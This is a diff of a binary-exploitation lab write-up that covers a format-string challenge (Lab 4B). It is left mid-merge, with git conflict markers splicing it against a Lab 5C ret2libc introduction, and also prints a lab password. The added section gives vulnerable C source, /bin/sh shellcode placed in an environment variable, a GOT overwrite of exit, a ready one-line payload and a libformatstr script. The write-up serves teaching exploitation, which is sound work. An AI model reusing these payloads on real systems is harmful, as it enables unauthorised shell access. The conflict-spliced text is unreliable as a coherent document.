@@ -1202,10 +1202,138 @@ bu7_1t_w4sn7_brUt3_f0rc34b1e!
 ```
 bu7_1t_w4sn7_brUt3_f0rc34b1e!
 ```
+<<<<<<< HEAD
 ## Lab 5C
 
 This time we'll be challenged with binaries having NX-bit enabled, which prevents us from jumping to shellcode in execution.
 We will use the simplest of so called "ROP" (Return Oriented Programming) techniques called ret2libc aka Return To Libc...
+=======
+## Lab 4B
+
+```C
+/*
+ *   Format String Lab - B Problem
+ *   gcc -z execstack -z norelro -fno-stack-protector -o lab4B lab4B.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+    int i = 0;
+    char buf[100];
+
+    /* read user input securely */
+    fgets(buf, 100, stdin);
+
+    /* convert string to lowercase */
+    for (i = 0; i < strlen(buf); i++)
+        if (buf[i] >= 'A' && buf[i] <= 'Z')
+            buf[i] = buf[i] ^ 0x20;
+    /* print out our nice and new lowercase string */
+    printf(buf);
+
+    exit(EXIT_SUCCESS);
+    return EXIT_FAILURE;
+}
+```
+ In this challenge, the bug is quite obvious: 100 bytes of our input will be converted to lowercase and fed as argument to ```printf()```. Any input characters between ASCII 0x41 and 0x5a will be converted to lowercase. As a consequence we may pay attention to the fact that our input must not contain any uppercase characters. 
+ In my opinion the easiest way to accomplish that chall would be to put our shellcode in environment, cause we just have 100 bytes room for wriggling.
+
+Another fact we must keep in mind is, that cause of putting it's own environment variables on stack, gdb will shift it. Usually the shift is around 64 up to 120 bytes so far. 
+
+```bash
+export PAYL=$(echo $'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80')
+``` 
+Additionally I would like to introduce a nice method of examing environment variables in gdb:
+```
+gdb-peda$ x/10s *(void**)environ
+0xbffff8a4:     "PAYL=", '\220' <repeats 16 times>, "\061\311\367\341\260\v\273$:\370\267\315\200"
+[...]
+```
+Here's the disassembly of the shellcode used above:
+
+```
+0x00000010    31c9           xor ecx, ecx                                                                                            
+0x00000012    f7e1           mul ecx                                                                                                 
+0x00000014    b00b           mov al, 0xb                    ; 11                                                                     
+0x00000016    bb243af8b7     mov ebx, 0xb7f83a24                                                                                     
+0x0000001b    cd80           int 0x80
+```
+
+What's at 0xb7f83a24? 
+
+```
+$ r2 -d ./lab4B
+[0x0804868d]> db main
+[0x0804868d]> dc
+[0x0804868d]> ps @ 0xb7f83a24
+/bin/sh
+```
+
+OK. So let's take a look at the possible targets:
+
+```
+$ checksec lab4B
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No      0               4       lab4B
+```
+No RELRO sos let's take a closer look at the GOT entries
+
+```
+$ readelf --relocs ./lab4B
+
+Relocation section '.rel.dyn' at offset 0x4bc contains 2 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804999c  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
+080499cc  00001005 R_386_COPY        080499cc   stdin
+
+Relocation section '.rel.plt' at offset 0x4cc contains 6 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+080499ac  00000207 R_386_JUMP_SLOT   00000000   printf
+080499b0  00000307 R_386_JUMP_SLOT   00000000   fgets
+080499b4  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__
+080499b8  00000507 R_386_JUMP_SLOT   00000000   exit
+080499bc  00000607 R_386_JUMP_SLOT   00000000   strlen
+080499c0  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
+```
+Is there a call to exit after our input has been fed to ```printf()```? 
+
+```
+0x08048724    e807feffff     call sym.imp.printf 
+0x08048729    c70424000000.  mov dword [esp], 0                                                                                      
+0x08048730    e82bfeffff     call sym.imp.exit
+```
+
+An overwrite of exit's GOT entry with the right address positioned in NOPsled will result in shell...
+
+```bash
+(echo $'\xb8\x99\x04\x08\xba\x99\x04\x08%63563x%6$hn%51116x%7$hn'; cat) | ./lab4B
+```
+
+There's also a handy python lib called [libformatstr](https://github.com/hellman/libformatstr) which eases construction of attack strings wwithous tedious calculations:
+
+```python
+from libformatstr import *
+
+got_exit=0x80499b8
+shellcode_address=0xbffff68a
+argnum=6
+padding=0
+
+fmt=FormatStr()
+fmt[got_exit]=shellcode_address
+
+print repr(fmt.payload(argnum,padding))
+
+```
+## Pass Lab4A
+
+```
+bu7_1t_w4sn7_brUt3_f0rc34b1e!
+```
+>>>>>>> 33e9a52abbcb08cb580e2e1c7cca302ead73efc1
 
 ```C
 #include <stdlib.h>
